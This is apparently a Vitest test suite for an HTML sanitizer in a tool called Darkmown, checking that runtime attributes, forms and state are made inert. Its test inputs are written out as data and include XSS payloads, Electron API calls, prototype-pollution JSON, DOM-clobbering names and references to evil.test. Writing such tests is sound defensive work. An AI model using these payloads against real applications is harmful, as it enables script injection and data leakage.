import { describe, expect, it } from "vitest";
import { sanitizeDarkmownBody } from "./security";

describe("Darkmown's offline runtime boundary", () => {
  it("rebuilds bounded inert state and preserves only reviewed runtime attributes", async () => {
    const result = await sanitizeDarkmownBody('<script type="application/json" data-wd-state>{"count":0}</script><span data-wd-bind="count">0</span><button data-wd-action="inc" data-wd-target="count">Add</button>', true);
    expect(result.seeds).toEqual(['{"count":0}']);
    expect(result.bodyHtml).toContain('data-wd-bind="count"');
    expect(result.bodyHtml).toContain('data-wd-action="inc"');
    expect(result.bodyHtml).not.toContain("<script");
    expect(result.warnings).toEqual([]);
  });

  it("untrusted previews have no runtime data and every control is disabled", async () => {
    const result = await sanitizeDarkmownBody('<script type="application/json" data-wd-state>{"count":0}</script><span data-wd-bind="count">0</span><button data-wd-action="inc" data-wd-target="count">Add</button><input data-wd-bind-input="count">', false);
    expect(result.seeds).toEqual([]);
    expect(result.bodyHtml).not.toContain("data-wd-");
    expect(result.bodyHtml).toMatch(/<button[^>]*disabled/);
    expect(result.bodyHtml).toMatch(/<input[^>]*disabled/);
  });

  it("removes only the compiler's now-inert skip link without dropping authored link text", async () => {
    const result = await sanitizeDarkmownBody('<a class="wd-skip-link" href="#main">Skip to content</a><a href="#main">My section link</a><h1>Counter</h1>', true);
    expect(result.bodyHtml).not.toContain("Skip to content");
    expect(result.bodyHtml).toContain("My section link");
    expect(result.bodyHtml).toContain("<h1>Counter</h1>");
  });

  it.each([
    '<script>parent.postMessage("attack","*");window.electronAPI.openFile()</script>',
    '<svg><a xlink:href="javascript:alert(1)"><animate attributeName="href" to="https://evil.test"></animate></a></svg>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe><object data="https://evil.test"></object>',
    '<link rel="stylesheet" href="https://evil.test"><style>@import "https://evil.test";</style>',
    '<meta http-equiv="refresh" content="0;url=https://evil.test"><base href="https://evil.test">',
    '<img src="https://evil.test" onerror="alert(1)"><video poster="https://evil.test"><source src="https://evil.test"></video>',
    '<template><img src="https://evil.test"><script>alert(1)</script></template>',
  ])("drops dangerous trees rather than allowing browser parsing side effects (%s)", async (markup) => {
    const result = await sanitizeDarkmownBody(markup, true);
    expect(result.bodyHtml).toBe("");
    expect(result.warnings).toHaveLength(1);
  });

  it("removes navigation, form submission, event handlers, author CSS and dynamic URL writers", async () => {
    const result = await sanitizeDarkmownBody('<a href="markie://private" ping="https://evil.test" onclick="alert(1)" style="background:url(https://evil.test)">Link</a><form action="https://evil.test" data-wd-form="send"><input type="file" formaction="https://evil.test" data-wd-bind-input="files"></form><span data-wd-attr=\'[["src",["L","https://evil.test"]]]\'>Text</span>', true);
    expect(result.bodyHtml).not.toMatch(/href|ping|onclick|style|form|data-wd-attr|type="file"/);
    expect(result.warnings).toHaveLength(1);
    expect(result.bodyHtml).toContain("Link");
  });

  it("disables network, effects, timers, storage, URL, theme and refetch capabilities", async () => {
    const result = await sanitizeDarkmownBody('<script type="application/json" data-wd-state data-wd-persist="x" data-wd-url="x">{"x":1}</script><div data-wd-fetch data-wd-fetch-key="x" data-wd-every data-wd-effect data-wd-store="x" data-wd-theme="x" data-wd-class="x">Text</div><button data-wd-action="refetch" data-wd-target="x">Fetch</button>', true);
    expect(result.seeds).toEqual(['{"x":1}']);
    expect(result.bodyHtml).not.toContain("data-wd-");
    expect(result.bodyHtml).toContain("disabled");
    expect(result.warnings).toHaveLength(1);
  });

  it.each([
    '<script type="text/javascript" data-wd-state>{"x":1}</script>',
    '<script type="application/json" data-wd-state>{"__proto__":{"x":1}}</script>',
    '<script type="application/json" data-wd-state>{"constructor":1}</script>',
    '<script type="application/json" data-wd-state>[1,2]</script>',
    '<script type="application/json" data-wd-state>{"x":</script>',
  ])("does not reinterpret invalid state as an executable script (%s)", async (markup) => {
    const result = await sanitizeDarkmownBody(markup, true);
    expect(result.seeds).toEqual([]);
    expect(result.bodyHtml).not.toContain("<script");
    expect(result.warnings).toHaveLength(1);
  });

  it("escapes raw script delimiters when regenerating inert JSON", async () => {
    const result = await sanitizeDarkmownBody('<script type="application/json" data-wd-state>{"x":"\\u003c/script>"}</script>', true);
    expect(result.seeds).toEqual(['{"x":"\\u003c/script>"}']);
  });

  it("validates closed action sequences and computed expression ASTs", async () => {
    const valid = await sanitizeDarkmownBody('<span data-wd-computed data-wd-computed-key="total" data-wd-computed-expr=\'["*",["S","count"],["L",2]]\'></span><button data-wd-actions=\'[{"op":"inc","target":"count"},{"op":"reset","target":"total"}]\'>Run</button>', true);
    expect(valid.bodyHtml).toContain("data-wd-computed-expr");
    expect(valid.bodyHtml).toContain("data-wd-actions");
    expect(valid.warnings).toEqual([]);
    const invalid = await sanitizeDarkmownBody('<span data-wd-computed data-wd-computed-key="total" data-wd-computed-expr=\'["eval","alert(1)"]\'></span><button data-wd-actions=\'[{"op":"inc","target":"constructor.prototype.x"}]\'>Run</button>', true);
    expect(invalid.bodyHtml).not.toContain("data-wd-");
    expect(invalid.warnings).toHaveLength(1);
  });

  it("does not permit computed string doubling or unknown runtime data on the wrong element", async () => {
    const result = await sanitizeDarkmownBody('<span data-wd-computed data-wd-computed-key="count" data-wd-computed-expr=\'["+",["S","count"],["S","count"]]\'></span><div data-wd-actions=\'[{"op":"inc","target":"count"}]\'>Not a button</div>', true);
    expect(result.bodyHtml).not.toContain("data-wd-");
    expect(result.warnings).toHaveLength(1);
  });

  it("keeps external forms inactive rather than quietly changing them into local state forms", async () => {
    const result = await sanitizeDarkmownBody('<form data-wd-form="profile" action="https://evil.test" method="post"><input name="name"><button type="submit">Send</button></form>', true);
    expect(result.bodyHtml).not.toContain("<form");
    expect(result.bodyHtml).not.toContain("data-wd-form");
    expect(result.bodyHtml).not.toContain('name="name"');
    expect(result.bodyHtml).toMatch(/<input[^>]*disabled/);
    expect(result.bodyHtml).toMatch(/<button[^>]*disabled/);
    expect(result.warnings).toHaveLength(1);
  });

  it.each(["reportValidity", "checkValidity", "querySelector", "querySelectorAll", "dispatchEvent", "hasAttribute", "getAttribute", "setAttribute", "removeAttribute", "closest", "matches", "elements", "submit", "requestSubmit", "reset", "ownerDocument", "attributes", "constructor", "prototype", "QUERYSELECTORALL"])("rejects form fields that clobber DOM operations (%s)", async (name) => {
    const result = await sanitizeDarkmownBody(`<form data-wd-form="profile"><input name="${name}"><select name="${name}"><option value="x">X</option></select><textarea name="${name}"></textarea><button type="submit">Send</button></form>`, true);
    expect(result.bodyHtml).not.toContain(`name="${name}"`);
    expect(result.bodyHtml).toMatch(/<input[^>]*disabled/);
    expect(result.bodyHtml).toMatch(/<select[^>]*disabled/);
    expect(result.bodyHtml).toMatch(/<textarea[^>]*disabled/);
    expect(result.warnings).toHaveLength(1);
  });

  it("rejects output and markup nesting budgets before browser insertion", async () => {
    await expect(sanitizeDarkmownBody("x".repeat(2_000_001), true)).rejects.toThrow("limit");
    await expect(sanitizeDarkmownBody("<div>".repeat(70) + "x" + "</div>".repeat(70), true)).rejects.toThrow("deeply");
  });
});
